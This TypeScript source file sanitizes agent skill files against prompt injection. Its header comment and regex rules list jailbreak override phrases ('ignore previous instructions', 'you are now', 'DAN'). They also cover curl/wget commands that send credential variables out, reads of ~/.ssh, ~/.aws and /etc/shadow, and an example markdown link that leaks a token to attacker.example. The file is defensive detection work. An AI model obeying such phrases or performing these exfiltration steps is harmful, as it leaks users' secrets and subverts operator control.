/**
 * SKILL.md body sanitizer — neutralizes common prompt-injection attack patterns
 * before the skill's markdown content is injected into an agent's system prompt.
 *
 * Regex-first approach. An LLM classifier second-pass is a future option (see
 * docs/superpowers/plans/2026-04-19-openclaw-unlock.md Open Question Q3).
 *
 * Threat model (what we defend against):
 *   1. Role-override / jailbreak: "ignore previous instructions", "you are now",
 *      "system:", "DAN", etc.
 *   2. Network exfil commands: curl/wget/Invoke-WebRequest with credential
 *      env var references ($API_KEY, $SLACK_TOKEN, etc.)
 *   3. Sensitive file access: ~/.ssh, ~/.aws, /etc/passwd, /etc/shadow, etc.
 *   4. Markdown link exfil: [text](https://attacker.example/steal?token=$API_KEY)
 *   5. Email / POST / send with credential reference
 *
 * Approach: detect + replace. For each match, replace the offending span with
 * a neutralized placeholder [[REDACTED: pattern-id]] and record the finding.
 * Skills with any critical finding can be blocked (Conservative trust) or
 * warned (Standard/Autonomous) at import time. Block 1 consumes.
 *
 * See Block 0.10 in the OpenClaw Unlock plan.
 */

export type SanitizeFinding = {
  pattern: string;
  severity: 'critical' | 'warning';
  excerpt: string;
  offset: number;
};

export type SanitizeResult = {
  sanitized: string;
  findings: SanitizeFinding[];
  hasCritical: boolean;
};

type Rule = {
  id: string;
  regex: RegExp;
  severity: 'critical' | 'warning';
  replacement: string;
};

const RULES: Rule[] = [
  // 1. Role override / jailbreak
  {
    id: 'jailbreak-ignore-instructions',
    regex: /ignore\s+(?:(?:all|the|any)\s+)?(?:previous|prior|above)\s+(?:instructions|guidance)/gi,
    severity: 'critical',
    replacement: '[[REDACTED: jailbreak-ignore-instructions]]',
  },
  {
    id: 'jailbreak-you-are-now',
    regex: /\byou\s+are\s+now\s+(?:a|an|the)\s+(?:penetration|hacker|root|admin|unrestricted|jailbroken)/gi,
    severity: 'warning',
    replacement: '[[REDACTED: jailbreak-you-are-now]]',
  },
  {
    id: 'jailbreak-system-role',
    regex: /\bsystem\s*:\s*(?:you|the\s+assistant|the\s+agent)/gi,
    severity: 'critical',
    replacement: '[[REDACTED: jailbreak-system-role]]',
  },
  {
    id: 'jailbreak-dan',
    regex: /\b(?:DAN|do\s+anything\s+now|jailbreak)\b/gi,
    severity: 'warning',
    replacement: '[[REDACTED: jailbreak-dan]]',
  },

  // 2. Network exfil with credential env var
  {
    id: 'network-exfil-curl-cred',
    regex: /(?:curl|wget|Invoke-WebRequest|iwr)[^\n]{0,200}(?:\$\{?[A-Z_]{3,}(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_CRED|_PWD)\}?|\$\{?(?:API_KEY|SLACK_TOKEN|GITHUB_TOKEN|ANTHROPIC_API_KEY|OPENAI_API_KEY|USER_PASSWORD)\}?)/gi,
    severity: 'critical',
    replacement: '[[REDACTED: network-exfil-with-credential]]',
  },

  // 3. Sensitive file access
  {
    id: 'file-exfil-sensitive-path',
    regex: /(?:cat|Get-Content|type|less|more|head|tail)\s+(?:~\/\.ssh\/[^\s]*|~\/\.aws\/[^\s]*|\/etc\/(?:passwd|shadow|hosts)|\$HOME\/\.ssh\/[^\s]*|\$HOME\/\.aws\/[^\s]*|%USERPROFILE%\\\.ssh\\[^\s]*|%USERPROFILE%\\\.aws\\[^\s]*)/gi,
    severity: 'critical',
    replacement: '[[REDACTED: file-exfil-sensitive-path]]',
  },

  // 4. Markdown link with credential in query string
  {
    id: 'link-exfil-credential-query',
    regex: /\]\(https?:\/\/[^)\s]+\?[^)]*\$\{?[A-Z_]{3,}(?:_KEY|_TOKEN|_SECRET|_PASSWORD)\}?[^)]*\)/gi,
    severity: 'critical',
    replacement: '](https://[[REDACTED: link-exfil-with-credential]])',
  },

  // 5. Email / send / POST with credential reference
  {
    id: 'network-email-with-credential',
    regex: /(?:email|mail|send|POST|post)\s+[^\n]{0,200}\$\{?[A-Z_]{3,}(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_PWD)\}?/gi,
    severity: 'critical',
    replacement: '[[REDACTED: email-with-credential]]',
  },
];

export function sanitizeSkillBody(body: string): SanitizeResult {
  const findings: SanitizeFinding[] = [];

  // First pass: collect all findings against the ORIGINAL body.
  for (const rule of RULES) {
    rule.regex.lastIndex = 0;
    let match: RegExpExecArray | null;
    while ((match = rule.regex.exec(body)) !== null) {
      findings.push({
        pattern: rule.id,
        severity: rule.severity,
        excerpt: match[0].slice(0, 80).replace(/\s+/g, ' ').trim(),
        offset: match.index,
      });
      if (match[0].length === 0) rule.regex.lastIndex++;
    }
  }

  // Second pass: apply replacements.
  let sanitized = body;
  for (const rule of RULES) {
    rule.regex.lastIndex = 0;
    sanitized = sanitized.replace(rule.regex, rule.replacement);
  }

  return {
    sanitized,
    findings,
    hasCritical: findings.some((f) => f.severity === 'critical'),
  };
}
